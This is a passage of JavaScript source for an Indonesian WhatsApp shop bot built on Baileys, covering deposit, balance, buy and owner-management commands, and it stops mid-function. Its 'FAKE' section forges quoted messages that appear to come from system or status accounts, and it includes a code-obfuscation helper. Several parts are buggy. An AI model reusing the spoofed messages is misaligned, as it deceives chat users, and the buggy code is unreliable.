  /*
      * Created By QyuuNee
      * Subscribe Biar Work :3
      * Minimal Credit Nya Lah
      * Buy Panel? 088210828960
      * SC INI GRATIS! LU JUAL? DEPET TIKET NERAKA
  */

  /*
      * Recode By IchanZX
      * Subscribe YT: IchanGaming
      * Minimal Credit Nya Lah
      * Buy Panel? Tele @ichanxd
      * MINIMAL BISA NGODING TOLOL JANGAN JUAL DOANG
  */
  require('./config')
  require('./lib/ichanzx-listmenu')
  const {
    default: makeWASocket,
    makeWALegacySocket,
    extractMessageContent,
    makeInMemoryStore,
    proto,
    downloadMediaMessage,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    getBinaryNodeChild,
    jidDecode,
    areJidsSameUser,
    generateWAMessage,
    generateWAMessageContent,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    WAMessageStubType,
    getContentType,
    relayMessage,
    WA_DEFAULT_EPHEMERAL
  } = require('@whiskeysockets/baileys')
  const { getGroupAdmins, runtime, fetchJson } = require("./functions.js")
  const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, TelegraPh, TmpFiles, toNumber, enumGetKey, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, getRandom, reSize } = require('./lib/myfunc')
  const { exec } = require("child_process")
  const cheerio = require("cheerio")
  const https = require('https');
  const chalk = require("chalk")
  const yts = require('yt-search')
  const path = require('path');
  const util = require("util")
  const FormData = require('form-data')
  const jsobfus = require('javascript-obfuscator')
  const axios = require("axios")
  const os = require('os');
  const fs = require("fs")
  const moment = require('moment-timezone')
  const owner = JSON.parse(fs.readFileSync("./owner.json"))
  const ichanimage = pickRandom(cover);

  const db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
  const { addSaldo, minSaldo, cekSaldo } = require("./lib/deposit");


  //Read Database
  global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
  if (global.db.data) global.db.data = {
      users: {},
      group: {},
      chats: {},
      database: {},
      settings: {},
      donate: {},
      others: {},
      sticker: {},
      ...(global.db.data || {})
  }

  moment.tz.setDefault("Asia/Jakarta").locale("id")

  module.exports = chanzx = async (chanzx, m, chatUpdate, store) => {
  try {
  const msg = m.msg
  const type = getContentType(msg.message)
  const content = JSON.stringify(msg.message)
  const from = mek.key.remoteJid
  const fatkuns = (msg.quoted || msg)
  const quoted = m.quoted ? m.quoted : m
  var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
  var prefix = prefa ? /^[#]/gi.test(body) ? body.match(/^[#]/gi)[0] : "" : prefa ?? global.prefix
  const isCmd = body.startsWith(prefix)
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const botNumber = chanzx.user.id.split(':')[0]
  const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
  const isGroup = from.endsWith('@g.us')
  const groupMetadata = isGroup ? await chanzx.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const senderNumber = sender.split('@')[0]
  const pushname = m.pushName || "No Name"
  const nomorOwner = [`6288989013781`]
  const isBot = botNumber.includes(senderNumber)
  const isOwner = nomorOwner.includes(senderNumber) || isBot
  const mentionUser = [...new Set([...(msg.mentionedJid || []), ...(msg.quoted ? [msg.quoted.sender] : [])])]
  const mentionByTag = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
  const mentionByReply = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || '' : ''
  const text = q = args.join(" ")
  var budy = (typeof text == 'string' ? text : '')
  const mime = (quoted.msg || quoted).mimetype || ''
  const qmsg = (quoted.msg || quoted)
  const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
  const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
  const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false

  const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
  const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
  const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
  const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
  const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
  const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
  const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
  const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
  const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')


  // Days
  const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
  const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
  const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
  const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

  const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
  if(time2 < "23:59:00"){
  var ucapanWaktu = 'Selamat Malam 🏙️'
  }
  if(time2 < "19:00:00"){
  var ucapanWaktu = 'Selamat Petang 🌆'
  }
  if(time2 < "18:00:00"){
  var ucapanWaktu = 'Selamat Sore 🌇'
  }
  if(time2 < "15:00:00"){
  var ucapanWaktu = 'Selamat Siang 🌤️'
  }
  if(time2 < "10:00:00"){
  var ucapanWaktu = 'Selamat Pagi 🌄'
  }
  if(time2 < "05:00:00"){
  var ucapanWaktu = 'Selamat Subuh 🌆'
  }
  if(time2 < "03:00:00"){
  var ucapanWaktu = 'Selamat Tengah Malam 🌃'
  }
  const mentions = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
  const getBuffer = async (url, options) => {
    try {
      options ? options : {}
      const res = await axios({
        method: "get",
        url,
        headers: {
  'DNT': 1,
  'Upgrade-Insecure-Request': 1
        },
        ...options,
        responseType: 'arraybuffer'
      })
      return res.data
    } catch (err) {
      return err
    }
  }

  const Styles = (text, style = 1) => {
    var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var yStr = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    xStr.map((v, i) =>
      replacer.push({
        original: v,
        convert: yStr[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };

  const isUrl = (url) => {
  return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
  }

  async function obfus(query) {
  return new Promise((resolve, reject) => {
  try {
  const obfuscationResult = jsobfus.obfuscate(query,
  {
  compact: false,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  numbersToExpressions: true,
  simplify: true, 
  stringArrayShuffle: true,
  splitStrings: true,
  stringArrayThreshold: 1
  }
  );
  const result = {
  status: 200,
  author: `Koneko-MD`,
  result: obfuscationResult.getObfuscatedCode()
  }
  resolve(result)
  } catch (e) {
  reject(e)
  }
  })
  }
  //━━━━━━━━━━━━━━━[ MEDIAFIRE ]━━━━━━━━━━━━━━━━━//
  const downloadFile = async (url, dest, name) => {
      const file = fs.createWriteStream(dest);
      https.get(url, (response) => {
          if (response.statusCode !== 200) {
              console.log(`Failed to get '${url}' (${response.statusCode})`);
              return;
          }
          response.pipe(file);

          file.on('finish', () => {
              file.close(async () => {
                  await chanzx.sendMessage(m.chat,{document: await fs.readFileSync(dest),mimetype: "application/zip",fileName: name,},{ quoted: m });
                  console.log('Download completed.');
                  fs.unlinkSync(`./${dest}`);
              });
          });
      }).on('error', (err) => {
          fs.unlink(dest, () => {}); // Hapus file jika terjadi kesalahan
          console.error(`Error downloading the file: ${err.message}`);
      });
  };
  //━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//
        const ftroli = {
      key: {
  fromMe: false,
  "participant": "0@s.whatsapp.net",
  "remoteJid": "status@broadcast"
      },
      "message": {
  orderMessage: {
    itemCount: 2022,
    status: 200,
    thumbnail: thumb,
    surface: 200,
    message: `${ttname}`,
    orderTitle: 'HuTod',
    sellerJid: '0@s.whatsapp.net'
  }
      },
      contextInfo: {
  "forwardingScore": 999,
  "isForwarded": true
      },
      sendEphemeral: true
  }

  const gasgas = {
              key: {
                  participant: `0@s.whatsapp.net`,
                  ...(m.chat ? {
                      remoteJid: `status@broadcast`
                  } : {})
              },
              message: {
                  "contactMessage": {
                      'displayName': `${pushname}`,
                      'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Shun,;;;\nFN: Shun Ai\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                      'jpegThumbnail': ichanimage,
                      thumbnail: ichanimage,
                      sendEphemeral: true
                  }   
              }
          }
          
  const fdoc = {
      key: {
  participant: '0@s.whatsapp.net',
  ...(from ? {
    remoteJid: `status@broadcast`
  } : {})
      },
      message: {
  documentMessage: {
    title: `${ttname}`,
    jpegThumbnail: thumb,
  }
      }
  }
  const fvn = {
      key: {
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "audioMessage": {
    "mimetype": "audio/ogg; codecs=opus",
    "seconds": 359996400,
    "ptt": "true"
  }
      }
  }

  const ftextt = {
      key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "extendedTextMessage": {
    "text": `${ttname}`,
    "title": `${botname}`,
    'jpegThumbnail': thumb,
  }
      }
  }

  const ftoko = {
      key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "productMessage": {
    "product": {
  "productImage": {
      "mimetype": "image/jpeg",
      "jpegThumbnail": thumb,
  },
  "title": `${ttname}`,
  "description": `${botname}`,
  "currencyCode": "IDR",
  "priceAmount1000": "1000000000000000000",
  "retailerId": `${ttname}`,
  "productImageCount": 1
    },
    "businessOwnerJid": `0@s.whatsapp.net`
  }
      }
  }

  const fgif = {
      key: {
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "videoMessage": {
    "title": `${ttname}`,
    "h": `Hmm`,
    'seconds': '359996400',
    'gifPlayback': 'true',
    'caption': `${ttname}`,
    'jpegThumbnail': thumb,
  }
      }
  }

  const fgclink = {
      key: {
  participant: "0@s.whatsapp.net",
  "remoteJid": "0@s.whatsapp.net"
      },
      "message": {
  "groupInviteMessage": {
    "groupJid": "6288210828960-1616169743@g.us",
    "inviteCode": "m",
    "groupName": `${ttname}`,
    "caption": `${ttname}`,
    'jpegThumbnail': thumb,
  }
      }
  }

  const fvideo = {
      key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "videoMessage": {
    "title": `${ttname}`,
    "h": `Hmm`,
    'seconds': '359996400',
    'caption': `${ttname}`,
    'jpegThumbnail': thumb,
  }
      }
  }

  const floc = {
      key: {
  participant: '0@s.whatsapp.net',
  ...(from ? {
    remoteJid: `status@broadcast`
  } : {})
      },
      message: {
  locationMessage: {
    name: `${ttname}`,
    jpegThumbnail: thumb,
  }
      }
  }

  const floc2 = {
      key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "liveLocationMessage": {
    "title": `${ttname}`,
    "h": `Hmm`,
    'jpegThumbnail': thumb,
  }
      }
  }

  const fkontak = {
      key: {
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: `status@broadcast`
  } : {})
      },
      message: {
  'contactMessage': {
    'displayName': `${ttname}`,
    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6288210828960:6288210828960\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
    'jpegThumbnail': thumb,
    thumbnail: thumb,
    sendEphemeral: true
  }
      }
  }

  const fakestatus = {
      key: {
  fromMe: false,
  participant: `0@s.whatsapp.net`,
  ...(from ? {
    remoteJid: "status@broadcast"
  } : {})
      },
      message: {
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
    "mimetype": "image/jpeg",
    "caption": `${ttname}`,
    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
    "fileLength": "28777",
    "height": 1080,
    "width": 1079,
    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
    "mediaKeyTimestamp": "1610993486",
    "jpegThumbnail": thumb,
    "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
  }
      }
  }

  const reply = async(teks) => {chanzx.sendMessage(from, {text: teks, mentions: await mentions(teks)})}
  function toRupiah(angka) {
  var saldo = '';
  var angkarev = angka.toString().split('').reverse().join('');
  for (var i = 0; i < angkarev.length; i++)
  if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
  return '' + saldo.split('', saldo.length - 1).reverse().join('');
  }
      
  try {
  let isNumber = x => typeof x === 'number' && !isNaN(x)
  let user = global.db.data.users[sender]
    if (typeof user !== 'object') global.db.data.users[sender] = {}
    if (user) {
  if (!isNumber(user.afkTime)) user.afkTime = -1
  if (!('afkReason' in user)) user.afkReason = ''
    } else global.db.data.users[sender] = {
  afkTime: -1,
  afkReason: '',
    }
    let chats = global.db.data.chats[from]
    if (typeof chats !== 'object') global.db.data.chats[from] = {}
    if (chats) {
  if (!('mute' in chats)) chats.mute = false
  if (!('antilink' in chats)) chats.antilink = false
  if (!('antilinkv2' in chats)) chats.antilinkv2 = false
    } else global.db.data.chats[from] = {
  mute: false,
  antilink: false,
  antilinkv2: false
    }
    let setting = global.db.data.settings[isBot]
  if (typeof setting !== 'object') global.db.data.settings[isBot] = {}
  if (setting) {
  if (!isNumber(setting.status)) setting.status = 0
  if (!('autoread' in setting)) setting.autoread = false
  } else global.db.data.settings[isBot] = {
  status: 0,
  autoread: false
  }
  } catch (err) {
  console.error(err)
  }

  try {
  ppuser = await chanzx.profilePictureUrl(sender, 'image')
  } catch (err) {
  ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }

  // Public & Self
  if (!chanzx.public) {
      if (!msg.key.fromMe && !isOwner) return
  }

  if (msg.message) {
  if (global.db.data.settings[isBot].autoread) {
  chanzx.readMessages([msg.key])
  }
  }

    for (let jid of mentionUser) {
  let user = global.db.data.users[jid]
  if (!user) continue
  let afkTime = user.afkTime
  if (!afkTime || afkTime < 0) continue
  let reason = user.afkReason || ''
  reply(`❗ Don't Tag Him!
  💤 He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
  ⏳ During ${clockString(new Date - afkTime)}
  `.trim())
  }

  if (db.data.users[sender].afkTime > -1) {
  let user = global.db.data.users[sender]
  reply(`
  🌤️ You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
  ⏳ During ${clockString(new Date - user.afkTime)}
  `.trim())
  user.afkTime = -1
  user.afkReason = ''
  }

  function khususOwner() {
  let izi = "Ngapain Bang?"
  reply(izi)
  }

  function khususGroup() {
  reply("Apa Coba 🗿")
  }

  const meki = await getBuffer(ppuser)

  if (mek.message) {
              console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(command)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(isGroup ? pushname : 'Private Chat', from))
          }

  //Anti Link WA
  if (db.data.chats[from].antilink) {
    if (budy.match(`chat.whatsapp.com`)) {
  reply(`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Maaf Kamu Akan Di Kick !`)
  let gclink = (`https://chat.whatsapp.com/` + await chanzx.groupInviteCode(from))
  let isLinkThisGc = new RegExp(gclink, 'i')
  let isgclink = isLinkThisGc.test(text)
  if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
  if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
  if (isOwner) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
  chanzx.groupParticipantsUpdate(from, [sender], 'remove')
    }
  }
  if (db.data.chats[from].antilinkv2) {
    if (budy.match(`chat.whatsapp.com`)) {
  reply(`「 ANTI LINK WHATSAPP 」\n\n*JANGAN SHARE GC LAIN!!!*`)
  let gclink = (`https://chat.whatsapp.com/` + await chanzx.groupInviteCode(from))
  let isLinkThisGc = new RegExp(gclink, 'i')
  let isgclink = isLinkThisGc.test(text)
  if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
  if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
  if (isOwner) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
  chanzx.sendMessage(from, { delete: from })
    }
  }

  // Mute Chat
  if (db.data.chats[from].mute && !isAdmins && !isOwner) {
    return
  }
  switch (command) {
  case "menu": {
  let anu = `👋🏻 Haloo Kak ${pushname}

  ▧ 「 *INFO BOT* 」
  ☍ Mode : *${chanzx.public ? `Public Mode` : `Self Mode`}*
  ☍ Status : *${isOwner ? `Owner Bot` : `User Bot`}*
  ☍ Runtime: *${runtime(process.uptime())}*

  ▧ 「 *MENU STORE AUTO ORDER* 」
  │ ${cbu} ${prefix}stok (*Menampilkan List Produk*)
  │ ${cbu} ${prefix}deposit (*Menambah Saldo Akun*)
  │ ${cbu} ${prefix}saldo (*Menampilkan Saldo Kamu*)
  │ ${cbu} ${prefix}buy (*Membeli Produk*)
  └──···

  ▧ 「 *MENU SETTINGS ONLY OWNER* 」
  │ ${cbu} ${prefix}addsaldo (*Menambah Saldo Pengguna*)
  │ ${cbu} ${prefix}minsaldo (*Mengurangi Saldo Pengguna*)
  │ ${cbu} ${prefix}addproduk (*Menambahkan Produk Baru*)
  │ ${cbu} ${prefix}addstok (*Menambahkan Stok Produk*)
  │ ${cbu} ${prefix}delsc (*Menghapus Produk*)
  │ ${cbu} ${prefix}setdesk (*Mengubah Deskripsi Produk*)
  │ ${cbu} ${prefix}setharga (*Mengubah Harga Produk*)
  │ ${cbu} ${prefix}kick (*Kick memer*)
  │ ${cbu} ${prefix}group open (*buka group*)
  │ ${cbu} ${prefix}group close (*tutup group*)
  │ ${cbu} ${prefix}setnote (*note produk*)
  └──···


  Powered By: *${wm2}*
  `
  chanzx.sendMessage(from, {
      text: anu,
      contextInfo: {
        externalAdReply: {
  showAdAttribution: true, 
  title: `${ucapanWaktu} ${pushname}`,
  body: "HuTod",
  thumbnail: thumb,
  sourceUrl: "https://chat.whatsapp.com/Cf5wYQbDK8cDnolIkPruwk",
  mediaType: 1,
  renderLargerThumbnail: true
        }
      }
    })
    //  chanzx.sendMessage(from, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
  }
  break;

  function addSaldo(user, amount, db_saldo) {
    if (!db_saldo[user]) {
        db_saldo[user] = 0;
    }
    db_saldo[user] += amount;
    fs.writeFileSync('./database/saldo.json', JSON.stringify(db_saldo, null, 5));
}

      case 'addsaldo': {
        let [nomor, bal] = text.split('|');
        if (!isOwner) return reply(OnlyOwn);
        if (!nomor || !bal) return reply(`Contoh: ${prefix}addsaldo 628xxxx|5000`);
        if (isNaN(bal)) return reply('Harus Angka tidak Boleh String!');
        addSaldo(nomor, Number(bal), db_saldo);
        reply('Success Menambah Saldo pada: ' + `wa.me/${nomor}`);
        chanzx.sendMessage(nomor + '@s.whatsapp.net', { text: `Anda Mendapatkan Saldo Bertambah Sebesar Rp${toRupiah(bal)}` });
    }
    break;
    

          function minSaldo(user, amount, db_saldo) {
            if (!db_saldo[user]) {
                db_saldo[user] = 0;
            }
            db_saldo[user] = Math.max(db_saldo[user] - amount, 0); // Pastikan saldo tidak negatif
            fs.writeFileSync('./database/saldo.json', JSON.stringify(db_saldo, null, 5));
        }

        case 'minsaldo': {
          let [nomor, bal] = text.split('|');
          if (!isOwner) return reply(OnlyOwn);
          if (!nomor || !bal) return reply(`Contoh: ${prefix}minsaldo 628xxxx|5000`);
          if (isNaN(bal)) return reply('Harus Angka tidak Boleh String!');
          minSaldo(nomor, Number(bal), db_saldo);
          reply('Success Mengurangi Saldo pada: ' + `wa.me/${nomor}`);
          chanzx.sendMessage(nomor + '@s.whatsapp.net', { text: `Pemotongan Saldo Anda Sebesar Rp${toRupiah(bal)}` });
      }
      break;
          
          case 'qris': case 'deposit': {
            try {
                validateRegistration(sender);
            } catch (err) {
                return;
            }
            const ref = require('crypto').randomBytes(7).toString("hex").toUpperCase();
            let qe = text;
            if (!text) return reply(`Contoh: ${prefix}qris 5000`);
            if (isNaN(qe)) return reply('Harus Angka tidak Boleh String!');
            if (Number(qe) < 2000) return reply('Minimal deposit 2000!');
        
            let cap = `━━━ ━ *DETAIL PEMBAYARAN* ━ ━━━\n\n  ◆ ID Transaksi: ${ref}\n  ◆ Harga Dibayarkan: ${toRupiah(qe)}\n  ◆ Transaksi Pada: ${hariini} : ${wib}\n  ◆ Payment VIA: QRIS ALL PAY\n\n  ${xxc}\n\n  🍀 *INFORMASI*\n  Silahkan Konfirmasi Kepada Owner ${ownernomer} Jika Telah\n  melakukan transfer Pembayaran Sertakan Bukti ScreenShot!!`;
        
            let pesanQris = chanzx.sendMessage(m.chat, { image: { url: qrispayment }, caption: cap }, { quoted: m });
            
            // Pastikan global.db.data.transaksi terdefinisi
            if (!global.db.data.transaksi) {
                global.db.data.transaksi = {};
            }
        
            // Timer untuk auto cancel dalam 3 menit dan hapus pesan QRIS
            setTimeout(() => {
                delete global.db.data.transaksi[sender];
                chanzx.sendMessage(m.chat, { delete: pesanQris.key });
                reply('Transaksi dibatalkan karena tidak ada pembayaran dalam 3 menit.');
            }, 180000);
        
            // Perintah cancel
            global.db.data.transaksi[sender] = { ref, amount: qe, waktu: Date.now() };
            reply(`Ketik *#cancel ${ref}* jika ingin membatalkan transaksi.`);
        }
        break;

        case 'saldo': {
          try {
              validateRegistration(sender);
          } catch (err) {
              return;
          }
          const message = `━━ *DETAIL AKUN KAMU* ━━
      
        • NAMA: ${pushname}
        • Nomor: ${sender.split('@')[0]}
        • Saldo: Rp${toRupiah(cekSaldo(sender.split('@')[0], db_saldo))}
      
        Untuk nambah Saldo ketik #deposit
      
        🍀 *Note :*
        _saldo hanya bisa untuk buy_
        _tidak bisa ditarik atau transfer_!`;
          reply(message);
      }
      break;

      case 'editdesksc': case 'setdesk':{
    if (!text) return reply('Format Salah. Gunakan format: .editdeskc IDPRODUK|DESKRIPSI BARU');
    if (!isOwner) return reply(OnlyOwn);
    const data = text.split('|');
    if (data.length < 2) {
        return reply('Format Salah. Gunakan format: .editdeskc IDPRODUK|DESKRIPSI BARU');
    }
    const id = data[0];
    const deksirp = data[1];

    let produkList = [];
    try {
        const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(existingData);
    } catch (err) {
        console.error(err);
    }

    const existingProdukIndex = produkList.findIndex(p => p.id === id);
    if (existingProdukIndex !== -1) {
        produkList[existingProdukIndex].desk = deksirp;
        fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));
        reply('Produk berhasil diedit!');
    } else {
        reply('Produk tidak ditemukan.');
    }
  }
  break;
      case 'edithargasc': case 'setharga':{
    if (!text) return reply('Format Salah. Gunakan format: .edithargasc IDPRODUK|HARGABARU');
    if (!isOwner) return reply(OnlyOwn);
    const data = text.split('|');
    if (data.length < 2) {
        return reply('Format Salah. Gunakan format: .edithargasc IDPRODUK|HARGABARU');
    }
    const id = data[0];
    const harga = parseFloat(data[1]);

    let produkList = [];
    try {
        const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(existingData);
    } catch (err) {
        console.error(err);
    }

    const existingProdukIndex = produkList.findIndex(p => p.id === id);
    if (existingProdukIndex !== -1) {
        produkList[existingProdukIndex].harga = harga;
        fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));
        reply('Produk berhasil diedit!');
    } else {
        reply('Produk tidak ditemukan.');
    }
  }
  break;
          case 'delsc': {
    if (!text) return reply('Format Salah. Gunakan format: .delsc IDPRODUK');
    if(!isOwner) return reply(OnlyOwn);
    const idProdukToDelete = text.trim();
    let produkList = [];
    try {
        const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(existingData);
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca data produk.');
    }
    const indexToDelete = produkList.findIndex(produk => produk.id === idProdukToDelete);
    if (indexToDelete !== -1) {
        produkList.splice(indexToDelete, 1);
        fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 4));
        fs.unlinkSync(`database/script/${idProdukToDelete}.zip`);
        reply('Produk berhasil dihapus!');
    } else {
        reply('Produk dengan ID yang diberikan tidak ditemukan.');
    }
  }
  break

  case 'addowner': {
    if (!isOwner) return reply('Perintah ini hanya bisa dijalankan oleh Owner.');

    if (!text) return reply('Format salah. Gunakan format: .addowner NOMOR');

    const nomorBaru = text.trim();
    let ownerList = [];
    try {
        const data = fs.readFileSync('database/owner.json', 'utf8');
        ownerList = JSON.parse(data);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error(err);
        }
    }

    if (ownerList.includes(nomorBaru)) {
        return reply('Nomor tersebut sudah menjadi Owner.');
    }

    ownerList.push(nomorBaru);
    fs.writeFileSync('database/owner.json', JSON.stringify(ownerList, null, 2));
    reply(`Nomor ${nomorBaru} berhasil ditambahkan sebagai Owner.`);
  }
  break;

  case 'delowner': {
    if(!isOwner) return reply(OnlyOwn);

    if (!text) return reply('Format salah. Gunakan format: .delowner NOMOR');

    const nomorHapus = text.trim();
    let ownerList = [];
    try {
        const data = fs.readFileSync('database/owner.json', 'utf8');
        ownerList = JSON.parse(data);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error(err);
        }
    }

    if (!ownerList.includes(nomorHapus)) {
        return reply('Nomor tersebut bukan Owner.');
    }

    ownerList = ownerList.filter(nomor => nomor !== nomorHapus);
    fs.writeFileSync('database/owner.json', JSON.stringify(ownerList, null, 2));
    reply(`Nomor ${nomorHapus} berhasil dihapus dari daftar Owner.`);
  }
  break;

  function isOwner(sender) {
    let ownerList = [];
    try {
        const data = fs.readFileSync('database/owner.json', 'utf8');
        ownerList = JSON.parse(data);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error(err);
        }
    }
    return ownerList.includes(sender.split('@')[0]);
  }

  function cekSaldo(user, db_saldo) {
    return db_saldo[user] || 0; // Mengembalikan saldo pengguna, default 0 jika tidak ditemukan
}

case 'buy': {
  try {
      validateRegistration(sender);
  } catch (err) {
      return;
  }
  if (!text) return reply('Format Salah. Gunakan format: #buy IDPRODUK|JUMLAH');
  const data = text.split('|');
  if (data.length < 2) {
      return reply('Format Salah. Gunakan format: #buy IDPRODUK|JUMLAH');
  }
  const id = data[0];
  const jumlah = parseInt(data[1], 10);

  let produkList = [];
  try {
      const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
      produkList = JSON.parse(existingData);
  } catch (err) {
      console.error(err);
      return reply('Terjadi kesalahan saat membaca data produk.');
  }

  const produk = produkList.find(p => p.id === id);
  if (!produk) {
      return reply('Produk tidak ditemukan.');
  }

  if (produk.stok < jumlah) {
      return reply('Stok tidak mencukupi.');
  }

  const stokPath = `./database/script/${id}.json`;
  let stokData = [];
  try {
      if (fs.existsSync(stokPath)) {
